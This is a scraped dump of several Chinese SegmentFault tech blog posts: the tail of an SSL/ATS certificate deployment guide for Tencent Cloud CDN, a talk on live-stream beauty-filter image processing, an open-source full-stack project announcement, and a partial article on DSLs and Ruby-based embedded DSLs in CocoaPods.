<p>前往<a href=""https://console.qcloud.com/cdn/tools/certificate/deploy"" rel=""nofollow noreferrer"">CDN高级工具-证书管理</a>界面，</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852347"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>根据情况选择希望配置证书的域名、证书类型和回源方式即可。这里需要满足前面提到的这个条件：域名的状态为 <strong>部署中</strong> 或 <strong>已启动</strong>。</p>
<p>勾选“腾讯托管证书”后，可以在证书列表下拉菜单中找到刚才申请到的证书。回源方式选择为 HTTPS，之后提交即可。</p>
<p>证书配置成功后，会出现 强制跳转 开关，开启后，即使用户发起 HTTP 请求，也会强制跳转为 HTTPS进行访问。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852348"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>检测部署效果</h2>
<p>完成上面一系列的操作之后，还需要最后确认部署的 SSL 证书是否符合 ATS 要求。否则，折腾了那么久，最终却是做了无用功的话，那是非常痛苦的一件事。</p>
<p>对此，云厂商也是提供了<a href=""https://www.qcloud.com/product/ssl"" rel=""nofollow noreferrer"">较为方便的检测方式</a>，只需要输入目标域名即可一键检测。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007852349"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""ATS 检测结果"" title=""ATS 检测结果""></span></p>
<p>至此，就完成了 App 服务器的 SSL 证书部署，并满足了苹果 ATS 协议的严格要求。</p>

                ", 还有 13 天，苹果就要关上 HTTP 大门了,1531971994,249,1,404,1,1,https://segmentfault.com/a/1190000007852337
82,1,0,6,"
                    
<blockquote><p>2016年作为视频直播元年，无论从资本层面不断高涨的估值，到平台主播各种天文数字的报酬，再到像“局座”这样的主流人士争相上直播，直播的社会热度可见一斑。而各大直播平台在经历了直播概念从无到有的阶段后，如何做出差异化，如何解决在野蛮生长期产生的各种涉黄问题，成为了几乎所有平台“成长的烦恼”。抛开政策、内容问题不说，单就技术层面，基于图像技术的创新成为解决这些难题最为可行的办法。作为Tu料的首个分享，我们首先就选择了直播这个热门话题，就图像技术在直播中的应用做一个入门的介绍。该分享系列整理自涂图CTO在架构师沙龙上的演讲内容。</p></blockquote>
<h2>一、技术框架</h2>
<p>爱美之心，人皆有之。早期的图片美颜教育了市场，到了直播时代，美颜同样成为直播平台的标配。就目前来说，直播美颜用的主流技术是OpenGL ES。它的好处首先是直接在GPU上运行的，所以性能高、功耗小，用在直播上比较划算。第二，它是跨平台的，iOS和安卓都支持，美颜效果能够直接在这两个平台上达到跨平台的效果。另外OpenGL ES有一个优势，就是有大量现成的开源库。比如像GPUImage，谷歌的grafika，还有基于安卓的一些具有实践意义的库，都是很常用的。网上也有一些比较热心的开发者把自己的美颜的算法直接开源，包括一整套解决方案，从采集到处理到美颜处理，到最后输出一个源编码，都有相关的解决方案。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVGcGw?w=1418&amp;h=699"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>二、美颜原理——混合不能少</h2>
<p>市面上大部分美颜产品的一般原理都是相似的。摄像头采集画面，通过一定的方式处理，最后输出一张美颜后的图片。</p>
<p>具体的说，原图首先经过磨皮处理，也就是把痘、斑这些消除掉。然后把经过磨皮的图片与原图进行混合。混合这个步骤是不可缺少的，因为如果只用磨皮后的图，很容易丢失细节。而且把两张图混合，还可以通过调整两个图的混合权重，来控制磨皮的程度，达成不同级别的磨皮效果。当然最后一步也很关键，就是美肤，比如把皮肤肤色调得白一点、红嫩一点，或者一些特殊的需求都可以实现。基本上大部分的美颜，都是这样的流程。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVGcGC?w=1126&amp;h=535"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>三、磨皮算法——去痘就是降噪</h2>
<p>本质上说，一张图就是一个二维的数据。如果相临的两个区域灰度值相差比较大，这就意味着存在着噪点。比如脸上有个痘，这个痘自然产生一个灰度值的变化，从抽象意义上说就是一个噪点。所以美颜磨皮的算法，核心是去噪。去噪有很多的办法，网上有各种各样的算法，包括现成的论文。但是不管产用什么算法，美颜的去噪算法都要保持一个特点，那就既要是边界保持，同时还要做到平滑，也就是要滤波。</p>
<p>滤波算法中比较常见的是双边滤波，它的优点在于很高效，因此非常适合移动平台。还有一些其他的算法比较复杂一点，也可以达到那样的效果，但是在移动应用上效率不高。虽然GPU是并行运算的，很适合这种运算，但GPU的能力是有一定范围的，超过这个范围也很耗电。包括双边滤波在内，一种滤波算法也有各种各样实现，考虑在移动平台上运行，可以做一下特别的优化，比如在精度计算里，适当降低精度，达到效果与效率的平衡。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVGcGM?w=1418&amp;h=705"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>四、肤色调整——检测才是难题</h2>
<p>在做好磨皮后，最后一个流程就是肤色调整。调整肤色本身的手法已经非常成熟，所以更难的其实在于肤色检测。为什么要做肤色检测？有些早期的直播美颜是没有这个功能的，所以他们就是以美化的肤色为基础，简单粗暴的把整个图像按这个色彩全部处理掉了，这就造成了整体偏色，效果还不如不做。因此，在处理图像前，必须先进行肤色检测，在图像的所有像素点中找到对应肤色范围的像素再进行处理。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVGcGV?w=1376&amp;h=669"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>直播中的肤色检测特殊的地方在于颜色空间的转换。因为跟图像处理相关的颜色空间主要有三种：RGB、YUV、HSV，而这三种色彩空间在直播中都要用到。</p>
<p>RGB是最常见的色彩空间，我们日常用的显示设备就是基于RGB空间，这里不多解释。</p>
<p>YUV是一种比较传统的颜色空间，最早是应用在电视信号的传播里面的，目前多用在直播的数据采样、传输的过程。这是因为人眼对亮度（Y）远比色度(U、V)更敏感，所以YUV比起RGB更容易被压缩，这样就更容易节省带宽进行传输。</p>
<p>而基于HSV颜色空间才是用来做肤色检测的。因为如果用RGB来做肤色检测，需要检测R、G、B三个值是否同时满足肤色的颜色范围，YUV同理。而HSV三个值：色调（H）、饱和度（S），明度（V）中，只有H是关乎肤色的，因此只需要对H进行考虑（H值在25-50之间即可判断为肤色），所需要的运算量自然比RGB少很多。</p>
<p>所以，在直播的不同阶段，要分别使用这三种色彩空间，要不停的把这三种色彩空间进行相互转换。</p>
<h2>五、细节——在算法之外</h2>
<p>美颜算法固然重要，但美更是一件很主观的事。算法写得非常优美和高效并不能保证美颜效果是最好的，所以用标准的算法处理后，还需要设计师依据自己的经验去进行调整。比如很多平台算法都大同小异，但是为什么最终出来的美颜效果让人感觉还是有差异，其实就是说里面有很多细节在，需要花时间优化，特别是用户的需求是什么，怎样更漂亮。</p>
<p>再举一个例子。很多平台在不同的光照条件下，比如白天、晚上，室内、室外，自然光、人工光，直播出来的美颜效果差异很大。这其中的原因可能就是算法中没有考虑光照因素，结果使很小的因素影响了效果。</p>
<p>所以，这就要求进行大量的测试，用技术手段结合人工去优化，才能保证最佳的美颜效果。还是那句话：细节是魔鬼。</p>
<h2>六、性能——不服跑个分？</h2>
<p>说到性能，iOS平台目前一般来说没什么问题，或者问题很少。比如 GPUImage是第三方的，算是iOS平台上很有历史的一个库。它实现了很多效果，比如刚才提到的一些算法，在GPUImage里面可以看到简单版的实现，包括怎么写脚本，怎么跑起来，怎么做双边滤波，里面有简单的实现，也可以有很好的效果。包括在做直播的时候，GPUImage可以作为很好的客户端扩展，唯一需要做的事情，就是加上一个推流；因为它包含的从客户端的采集、处理到每一帧的数据，无论是YUV，还是RGB，都可以输出来。所以iOS平台上相对来说问题少很多。</p>
<p>而安卓平台问题就比较大了。因为安卓本身的特点，厂商很多、设备很多、系统版本很多，因此相互间比较难兼容。</p>
<p>第一个是设备问题。比如一个美颜算法在不同机器上跑起来，即使是同一款GPU，性能也可能会差别很大。所以，为了保证一个脚本去适应不同的机器，有种办法是这样的：根据GPU的性能做了一个分级算法，如果评级比较高就采用最复杂的算法，如果性能评级比较低，就把美颜效果降低，保证在大部分环境下使用。</p>
<p>第二是版本的问题。比如，只有4.0以上版本才能够通过相机，直接从相机采集里面获取到一个纹理，这个叫GLTEXTUREEXTERNAL_OES，相机直接把采集到的画面转给GPU，全部通过GPU加速。4.3以后可以做什么事情？从相机采集到处理到编码，走的是全GPU，这是效果最好的也是最快的，当然这对系统的兼容要求是最高的。因为有些厂商在实现的时候没有兼容这些东西，所以GPU加速很难做。</p>
<p>还有输出YUV。很多直播平台都要支持输出YUV。这些YUV的数据就涉及到CPU和GPU的转换过程。因为处理可能是在GPU里面完成的，GPU没法直接输出来，就需要从GPU到CPU的转换，这个目前来说还没有比较好的方案。安卓目前一些底层的GPU还没有开放，有的时候可以通过Graphics Buffer来实现，但是安卓并没有把这个开放出来。如果要有这个东西，唯一能做的是把安卓源代码拿出来，包括把源代码link到关键码里面去，这样才能达到比较好的效果。CPU到GPU的转换，是可以毫秒级别的，如果直接从GPU转换到CPU，可能好的设备也会花费20毫秒左右，这样导致的数据，你预测的是24帧，可能就会有掉帧的情况。在主流上可能影响不大，大部分情况下都是可以接受的，当然这最后也要看用户只有的应用场景。</p>
<p>最后说说常被问到的一个问题： iOS平台、安卓平台都自带有人脸检测的API，为什么不用？</p>
<p>首先是系统频率低、速度慢。苹果可能有这样一个考虑，不要影响到相机API的正常使用，所以频率很低。检测一次可能3秒钟；不是检测一次需要3秒钟，而是3秒钟才给你一个数据，告诉你这张照片有没有人脸。而作为一个实用的产品，一秒钟假设24帧，起码要做十几次检测才可以达到实时的要求，要不然的话跟不上对帧率的要求。在安卓问题更严重，因为还要看设备，有些设备甚至就没有，厂商把这个设置就直接去掉了。另外一个特征点的问题。iOS上面有这些特征点，比如眼睛、嘴巴、鼻子这些，安卓上面是直接没有这些特征点的。</p>
<h2>七、美颜2.0——从化妆到整容</h2>
<p>以上的内容都属于美颜1.0的概念，而目前最新的美颜技术已经发展到了2.0概念。打个简单的比方，如果美颜1.0只是化妆的话，美颜2.0基本就能达到整容的效果——把眼睛变大，把圆脸变成瓜子脸。而实现这一效果的基础就是人脸识别。这很好理解，只有确定了有没有人脸，知道了五官在什么位置，我们才能把它们“整”的更漂亮。</p>
<p>关于人脸识别，就又是一个大问题了。限于篇幅，我们会在下一期详细展开这个问题说。</p>

                ", 图像技术在直播中的应用（上）——美颜技术,1531971996,251,1,827,1,1,https://segmentfault.com/a/1190000007636239
83,1,0,6,"
                    
<p>最近三年的工作经历，让我有机会接触到不同技术栈的项目，并且从中积累了不少各个技术栈的开发经验，虽然技术深度不够，但可以用不同技术视角去思考项目的设计和开发，例如：以客户端开发的视角去思考 API 的设计、用客户端开发的思路去开发前端项目等，然而这些经验都分散在了我这两年半时间里做的大大小小的项目里。</p>
<p>所以我希望可以将我的这些经验归纳总在「 daza.io 」这个项目里，它的实质是一个内容聚合项目（参考了即刻的形式），用程序去收集一些可能感兴趣的文章，并通过其他用户对于文章的评判，以达到筛选到优质内容，提高学习效率。</p>
<p>另外它还有另外一个作为，为我的其他小项目提供数据。最简单的一个例子就是最近在写的个人博客，其中有一个模块就是用地图展示我旅行的足迹，数据就是来源于它。</p>
<p><strong>我的进步离不开开源，所以「 daza.io 」也是全部开源的</strong></p>
<blockquote><p>「 daza.io 」是打杂的拼音，也是对一种自嘲，其实个人感觉敢自称自己是打杂的人综合能力都是挺强的。</p></blockquote>
<ul>
<li><p>主页：<a href=""http://daza.io"" rel=""nofollow noreferrer"">http://daza.io</a></p></li>
<li><p>接口：<a href=""http://api.daza.io"" rel=""nofollow noreferrer"">http://api.daza.io</a></p></li>
</ul>
<h2>LOGO</h2>
<blockquote><p>LOGO 是请我一个设计师朋友设计的，个人非常喜欢他的设计，与他合作的两年来也得到了挺多关于设计及用户体验上的经验。</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007140206"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>网站截图</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007140207"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>技术栈</h2>
<h3>REST</h3>
<blockquote><p>本人是非常喜欢文档先行的工作方式的，先用文档将思路整理一遍，然后在开发的时候再次完善。这次我在对比了多个文档工具最终选择了 Swagger 。</p></blockquote>
<ul><li><p>Swagger</p></li></ul>
<p><strong>查看文档： <a href=""http://api.daza.io/docs/strong"" rel=""nofollow noreferrer"">http://api.daza.io/docs</a></strong></p>
<h3>后端（ API Only ）</h3>
<blockquote><p>在最终采用 Laravel 之前，我一度已经在使用 Sails.js 开发了，但由于考虑到代码被其他项目重用及市场现状，并且上半年负责的项目刚好使用了 Laravel 。</p></blockquote>
<ul>
<li><p>Laravel 5.3</p></li>
<li><p>MySQL</p></li>
</ul>
<h3>前端</h3>
<blockquote><p>使用了现在非常火的 Vue.js 框架开发，肯定有人会问，现在 Vue.js 2.0 都已经发布了，为什么不用 2.0 写。那是因为这个项目在 5 月就已经创建了，所以在现在在使用 2.0 进行开发自己的<a href=""https://github.com/lijy91/jianying.li"" rel=""nofollow noreferrer"">个人博客</a>项目，一但把 1.x 和 2.0 的一些差异了解得差不多后就会升级。</p></blockquote>
<ul>
<li><p>Vue.js 1.x</p></li>
<li><p>vuex</p></li>
<li><p>vue-router</p></li>
<li><p>vue-resource</p></li>
<li><p>vue-validator</p></li>
</ul>
<h3>客户端</h3>
<h4>iOS</h4>
<blockquote><p>使用 Swift 2.3 进行开发，基本参考了今日头条和即刻的设计，目前已经完成主要功能。</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007140208"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><strong>备注：将会以付费软件的形式发布到 AppStore</strong></p>
<h4>Android</h4>
<blockquote><p>尚未开始！</p></blockquote>
<h4>部署</h4>
<blockquote><p>项目其实通过 Docker + DaoCloud 实现了自动化部署，只要把代码推送到 GitHub ， DaoCloud 将会自动构建并部署。</p></blockquote>
<ul>
<li><p>Docker</p></li>
<li><p>DaoCloud</p></li>
<li><p>七牛云存储</p></li>
</ul>
<h2>项目地址</h2>
<ul>
<li><p><a href=""https://github.com/lijy91/daza-backend"" rel=""nofollow noreferrer"">daza-backend</a></p></li>
<li><p><a href=""https://github.com/lijy91/daza-frontend"" rel=""nofollow noreferrer"">daza-frontend</a></p></li>
<li><p><a href=""https://github.com/lijy91/daza-ios"" rel=""nofollow noreferrer"">daza-ios</a></p></li>
<li><p><a href=""https://github.com/lijy91/daza-android"" rel=""nofollow noreferrer"">daza-android</a></p></li>
</ul>
<h2>加入讨论</h2>
<blockquote><p>如果你对这个项目有兴趣，想吐槽，想提建议，为项目提供服务，欢迎加以下讨论群。</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007140209"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>关于我</h2>
<blockquote><p>欢迎同行交流或者有好工作机会的朋友加我微信。</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007140210"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>支持一下</h2>
<blockquote><p>如果你觉得我的代码写得还不错对你有帮助，请扫下面二维码。</p></blockquote>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007140211"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>

                ", 「daza.io」这将是我独立完成全端开发的项目,1531971997,531,1,150,1,1,https://segmentfault.com/a/1190000007140203
84,1,0,6,"
                    
<blockquote>
<p>最近在公司做了一次有关 DSL 在 iOS 开发中的应用的分享，这篇文章会简单介绍这次分享的内容。</p>
<p>因为 DSL 以及 DSL 的界定本身就是一个比较模糊的概念，所以难免有与他人观点意见相左的地方，如果有不同的意见，我们可以具体讨论。</p>
</blockquote>
<p>这次文章的题目虽然是谈谈 DSL 以及 DSL 的应用，不过文章中主要侧重点仍然是 DSL，会简单介绍 DSL 在 iOS 开发中（CocoaPods）是如何应用的。</p>
<h2>没有银弹？</h2>
<p>1987 年，IBM 大型电脑之父 Fred Brooks 发表了一篇关于软件工程中的论文 <a>No Silver Bullet—Essence and Accidents of Software Engineering</a> 文中主要围绕这么一个观点：没有任何一种技术或者方法能使软件工程的生产力在十年之内提高十倍。</p>
<blockquote><p>There is no single development, in either technology or management technique, which by itself promises even one order-of-magnitude improvement within a decade in productivity, in reliability, in simplicity.</p></blockquote>
<p>时至今日，我们暂且不谈银弹在软件工程中是否存在（<del>这句话在老板或者项目经理要求加快项目进度时，还是十分好用的</del>），作为一个开发者也不是很关心这种抽象的理论，我们更关心的是开发效率能否有实质的提升。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007094899?w=928&amp;h=493"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""silver-bullet"" title=""silver-bullet""></span></p>
<p>而今天要介绍的 DSL 就可以真正的提升生产力，减少不必要的工作，在一些领域帮助我们更快的实现需求。</p>
<h2>DSL 是什么？</h2>
<blockquote><p>笔者是在两年以前，在大一的一次分享上听到 DSL 这个词的，但是当时并没有对这个名词有多深的理解与认识，听过也就忘记了，但是最近做的一些开源项目让我重新想起了 DSL，也是这次分享题目的由来。</p></blockquote>
<p>DSL 其实是 Domain Specific Language 的缩写，中文翻译为<em>领域特定语言</em>（下简称 DSL）；而与 DSL 相对的就是 GPL，这里的 GPL 并不是我们知道的开源许可证，而是 General Purpose Language 的简称，即<em>通用编程语言</em>，也就是我们非常熟悉的 Objective-C、Java、Python 以及 C 语言等等。</p>
<p><a href=""https://en.wikipedia.org/wiki/Domain-specific_language"" rel=""nofollow noreferrer"">Wikipedia</a> 对于 DSL 的定义还是比较简单的：</p>
<blockquote>
<p>A specialized computer language designed for a specific task.</p>
<p>为了解决某一类任务而专门设计的计算机语言。</p>
</blockquote>
<p>与 GPL 相对，DSL 与传统意义上的通用编程语言 C、Python 以及 Haskell 完全不同。通用的计算机编程语言是可以用来编写任意计算机程序的，并且能表达任何的<strong>可被计算</strong>的逻辑，同时也是 <a href=""https://en.wikipedia.org/wiki/Turing_completeness"" rel=""nofollow noreferrer"">图灵完备</a> 的。</p>
<blockquote><p>这一小节中的 DSL 指外部 DSL，下一节中会介绍 <a>内部 DSL/嵌入式 DSL</a></p></blockquote>
<p>但是在里所说的 DSL 并不是图灵完备的，它们的<strong>表达能力有限</strong>，只是在特定领域解决特定任务的。</p>
<blockquote><p>A computer programming language of limited expressiveness focused on a particular domain.</p></blockquote>
<p>另一个世界级软件开发大师 Martin Fowler 对于领域特定语言的定义在笔者看来就更加具体了，<strong>DSL 通过在表达能力上做的妥协换取在某一领域内的高效</strong>。</p>
<p>而有限的表达能力就成为了 GPL 和 DSL 之间的一条界限。</p>
<h3>几个栗子</h3>
<p>最常见的 DSL 包括 Regex 以及 HTML &amp; CSS，在这里会对这几个例子进行简单介绍</p>
<ul>
<li>
<p>Regex</p>
<ul><li><p>正则表达式仅仅指定了字符串的 pattern，其引擎就会根据 pattern 判断当前字符串跟正则表达式是否匹配。<br><span class=""img-wrap""><img data-src=""/img/remote/1460000007094900?w=1280&amp;h=600"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""regex"" title=""regex""></span></p></li></ul>
</li>
<li>
<p>SQL</p>
<ul><li><p>SQL 语句在使用时也并没有真正的执行，我们输入的 SQL 语句最终还要交给数据库来进行处理，数据库会从 SQL 语句中<strong>读取</strong>有用的信息，然后从数据库中返回使用者期望的结果。</p></li></ul>
</li>
<li>
<p>HTML &amp; CSS</p>
<ul><li><p>HTML 和 CSS 只是对 Web 界面的结构语义和样式进行描述，虽然它们在构建网站时非常重要，但是它们并非是一种编程语言，正相反，我们可以认为 HTML 和 CSS 是在 Web 中的领域特定语言。</p></li></ul>
</li>
</ul>
<h3>Features</h3>
<p>上面的几个?明显的缩小了通用编程语言的概念，但是它们确实在自己领域表现地非常出色，因为这些 DSL 就是根据某一个特定领域的特点塑造的；而通用编程语言相比领域特定语言，在设计时是为了解决更加抽象的问题，而关注点并不只是在某一个领域。</p>
<p>上面的几个例子有着一些共同的特点：</p>
<ul>
<li><p>没有计算和执行的概念；</p></li>
<li><p>其本身并不需要直接表示计算；</p></li>
<li><p>使用时只需要声明规则、事实以及某些元素之间的层级和关系；</p></li>
</ul>
<p>虽然了解了 DSL 以及 DSL 的一些特性，但是，到目前为止，我们对于如何构建一个 DSL 仍然不是很清楚。</p>
<h3>构建 DSL</h3>
<p>DSL 的构建与编程语言其实比较类似，想想我们在重新实现编程语言时，需要做那些事情；实现编程语言的过程可以简化为定义语法与语义，然后实现编译器或者解释器的过程，而 DSL 的实现与它也非常类似，我们也需要对 DSL 进行语法与语义上的设计。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007094901?w=1440&amp;h=900"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""compile"" title=""compile""></span></p>
<p>总结下来，实现 DSL 总共有这么两个需要完成的工作：</p>
<ol>
<li><p>设计语法和语义，定义 DSL 中的元素是什么样的，元素代表什么意思</p></li>
<li><p>实现 parser，对 DSL 解析，最终通过解释器来执行</p></li>
</ol>
<p>以 HTML 为例，HTML 中所有的元素都是包含在尖括号 <code>&lt;&gt;</code> 中的，尖括号中不同的元素代表了不同的标签，而这些标签会被浏览器<strong>解析</strong>成 DOM 树，再经过一系列的过程调用 Native 的图形 API 进行绘制。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007094902?w=731&amp;h=396"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""dom-tree"" title=""dom-tree""></span></p>
<p>再比如，我们使用下面这种方式对一个模型进行定义，实现一个 ORM 领域的 DSL：</p>
<pre><code class=""ruby"">define :article do
  attr :name
  attr :content
  attr :upvotes, :int
  
  has_many :comments
end</code></pre>
<p>在上面的 DSL 中，使用 <code>define</code> 来定义一个新的模型，使用 <code>attr</code> 来为模型添加属性，使用 <code>has_many</code> 建立数据模型中的一对多关系；我们可以使用 DSL 对这段“字符串”进行解析，然后交给代码生成器来生成代码。</p>
<pre><code class=""swift"">public struct Article {
    public var title: String
    public var content: String
    public var createdAt: Date
    
    public init(title: String, content: String, createdAt: Date)

    static public func new(title: String, content: String, createdAt: Date) -&gt; Article
    static public func create(title: String, content: String, createdAt: Date) -&gt; Article?
    ...
}</code></pre>
<p>这里创建的 DSL 中的元素数量非常少，只有 <code>define</code> <code>attr</code> 以及 <code>has_many</code> 等几个关键字，但是通过这几个关键字就可以完成在模型层需要表达的绝大部分语义。</p>
<h3>设计原则和妥协</h3>
<p>DSL 最大的设计原则就是<strong>简单</strong>，通过简化语言中的元素，降低使用者的负担；无论是 Regex、SQL 还是 HTML 以及 CSS，其说明文档往往只有几页，非常易于学习和掌握。但是，由此带来的问题就是，DSL 中缺乏抽象的概念，比如：模块化、变量以及方法等。</p>
<blockquote><p>抽象的概念并不是某个领域所关注的问题，就像 Regex 并不需要有模块、变量以及方法等概念。</p></blockquote>
<p>由于抽象能力的缺乏，在我们的项目规模变得越来越大时，DSL 往往满足不了开发者的需求；我们仍然需要编程语言中的模块化等概念对 DSL 进行补充，以此解决 DSL 并不是真正编程语言的问题。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007094903?w=500&amp;h=300"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""css-sass"" title=""css-sass""></span></p>
<p>在当今的 Web 前端项目中，我们在开发大规模项目时往往不会直接手写 CSS 文件，而是会使用 Sass 或者 Less 为 CSS 带来更强大的抽象能力，比如嵌套规则，变量，混合以及继承等特性。</p>
<pre><code class=""css"">nav {
  ul {
    margin: 0;
    padding: 0;
    list-style: none;
  }

  li { display: inline-block; }

  a {
    display: block;
    padding: 6px 12px;
    text-decoration: none;
  }
}</code></pre>
<p>也就是说，在使用 DSL 的项目规模逐渐变大时，开发者会通过增加抽象能力的方式，对已有的 DSL 进行拓展；但是这种扩展往往需要重新实现通用编程语言中的特性，所以一般情况下都是比较复杂的。</p>
<h2>Embedded DSL（嵌入式 DSL）</h2>
<p>那么，是否有一种其它的方法为 DSL 快速添加抽象能力呢？而这也就是这一小节的主题，嵌入式 DSL。</p>
<p>在上一节讲到的 DSL 其实可以被称为外部 DSL；而这里即将谈到的嵌入式 DSL 也有一个别名，内部 DSL。</p>
<p>这两者最大的区别就是，内部 DSL 的实现往往是嵌入一些编程语言的，比如 iOS 的依赖管理组件 CocoaPods 和 Android 的主流编译工具 Gradle，前者的实现是基于 Ruby 语言的一些特性，而后者基于 Groovy。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007094904?w=800&amp;h=450"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""cocoapods"" title=""cocoapods""></span></p>
<p>CocoaPods 以及其它的嵌入式 DSL 使用了宿主语言（host language）的抽象能力，并且省去了实现复杂语法分析器（Parser）的过程，并不需要重新实现模块、变量等特性。</p>
<p>嵌入式 DSL 的产生其实模糊了框架和 DSL 的边界，不过这两者看起来也没有什么比较明显的区别；不过，DSL 一般会使用宿主语言的特性进行创造，在设计 DSL 时，也不会考虑宿主语言中有哪些 API 以及方法，而框架一般都是对语言中的 API 进行组合和再包装。</p>
<blockquote><p>我们没有必要争论哪些是框架，哪些是 DSL，因为这些争论并没有什么意义。</p></blockquote>
<h3>Rails 和 Embedded DSL</h3>
<p>最出名也最成功的嵌入式 DSL 应该就是 Ruby on Rails 了，虽然对于 Rails 是否是 DSL 有争议，不过 Rails 为 Web 应用的创建提供大量的内置的支撑，使我们在开发 Web 应用时变得非常容易。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000007094905?w=1024&amp;h=768"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""rails"" title=""rails""></span></p>
<h2>Ruby、 DSL 和 iOS</h2>
<blockquote><p>为了保证这篇文章的完整性，这一小节中有的一些内容都出自上一篇文章 <a href=""https://github.com/Draveness/iOS-Source-Code-Analyze/blob/master/contents/CocoaPods/CocoaPods%20"" rel=""nofollow noreferrer"">CocoaPods 都做了什么？</a>。</p></blockquote>
<p>笔者同时作为 iOS 和 Rails 开发者接触了非常多的 DSL，而在 iOS 开发中最常见的 DSL 就是 CocoaPods 了，而这里我们以 CocoaPods 为例，介绍如何使用 Ruby 创造一个嵌入式 DSL。</p>
<h3>Why Ruby？</h3>
<p>看到这里有人可能会问了，为什么使用 Ruby 创造嵌入式 DSL，而不是使用 C、Java、Python 等等语言呢，这里大概有四个原因：</p>
<ul>
<li><p>一切皆对象的特性减少了语言中的元素，不存在基本类型、操作符；</p></li>
<li><p>向 Ruby 方法中传入代码块非常方便；</p></li>
<li><p>作为解释执行的语言，eval 模糊了数据和代码的边界；</p></li>
<li><p>不对代码的格式进行约束，同时一些约定减少了代码中的噪音。</p></li>
</ul>
<h4>一切皆对象</h4>
<p>在许多语言，比如 Java 中，数字与其他的基本类型都不是对象，而在 Ruby 中所有的元素，包括基本类型都是对象，同时也不存在运算符的概念，所谓的 <code>1 + 1</code>，其实只是 <code>1.+(1)</code> 的语法糖而已。</p>
<p>得益于一切皆对象的概念，在 Ruby 中，你可以向任意的对象发送 <code>methods</code> 消息，在运行时自省，所以笔者在每次忘记方法时，都会直接用 <code>methods</code> 来“查阅文档”：</p>
<pre><code class=""ruby"">2.3.1 :003 &gt; 1.methods
 =&gt; [:%, :&amp;, :*, :+, :-, :/, :&lt;, :&gt;, :^, :|, :~, :-@, :**, :&lt;=&gt;, :&lt;&lt;, :&gt;&gt;, :&lt;=, :&gt;=, :==, :===, :[], :inspect, :size, :succ, :to_s, :to_f, :div, :divmod, :fdiv, :modulo, ...]</code></pre>
<p>比如在这里向对象 <code>1</code> 调用 <code>methods</code> 就会返回它能响应的所有方法。</p>
<p>一切皆对象不仅减少了语言中类型的数量，消灭了基本数据类型与对象之间的边界；这一概念同时也简化了组成语言的元素，这样 Ruby 中只有对象和方法，这两个概念，极大降低了这门语言的复杂度：</p>
<ul>
<li><p>使用对象存储状态</p></li>
<li><p>对象之间通过方法通信</p></li>
</ul>
<h4>block</h4>
<p>Ruby 对函数式编程范式的支持是通过 block，这里的 block 和 Objective-C 中的 block 有些不同。</p>
<p>首先 Ruby 中的 block 也是一种对象，即 <code>Proc</code> 类的实例，也就是所有的 block 都是 first-class 的，可以作为参数传递，返回。</p>
<p>下面的代码演示了两种向 Ruby 方法中传入代码块的方式：</p>
<pre><code class=""ruby"">def twice(&amp;proc)
    2.times { proc.call() } if proc
end

def twice
    2.times { yield } if block_given?
end</code></pre>
<p><code>yield</code> 会调用外部传入的 block，<code>block_given?</code> 用于判断当前方法是否传入了 <code>block</code>。</p>
<pre><code class=""ruby"">twice do 
    puts ""Hello""
end

twice { puts ""hello"" }</code></pre>
<p>向 <code>twice</code> 方法传入 block 也非常简单，使用 <code>do</code>、<code>end</code> 或者 <code>{</code>、<code>}</code> 就可以向任何的 Ruby 方法中传入代码块。</p>
<h4>eval</h4>
<p>早在几十年前的 Lisp 语言就有了 <code>eval</code> 这个方法，这个方法会将字符串当做代码来执行，也就是说 <code>eval</code> 模糊了代码与数据之间的边界。</p>
